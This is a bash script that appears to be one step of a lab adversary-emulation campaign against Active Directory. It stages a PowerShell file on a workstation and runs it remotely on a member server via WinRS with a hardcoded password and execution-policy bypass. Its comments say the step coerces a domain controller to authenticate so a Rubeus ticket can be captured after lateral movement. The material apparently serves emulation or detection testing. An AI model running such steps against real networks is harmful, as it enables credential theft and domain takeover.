#!/usr/bin/env bash
# T102 — Coerce dc02$ to authenticate to mbr01, capturing the TGS with Rubeus.
# Runs from the mbr01 beachhead after T101 lateral movement.
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T102-COERCE-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T102 | ${CASE_ID} | T0=${T0} ==="

PS1_LOCAL="${CAMPAIGN_A_LIB}/../windows/campaign-a-t102-mbr01-coerce.ps1"
bash "${CAMPAIGN_A_LIB}/ws01-stage-file.sh" "${PS1_LOCAL}" "campaign-a-t102-mbr01-coerce.ps1"

# Execute on mbr01 via WinRS from ws01 using analyst_t1 credentials
CMD="powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Tools\\cadre-attack\\campaign-a-t102-mbr01-coerce.ps1"

ws01_exec_as analyst_t1 'T13r_An@lyst!' "$CMD"

cadre_export "${CASE_ID}" T102 "${T0}" 192.168.77.22
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T102 run complete ==="
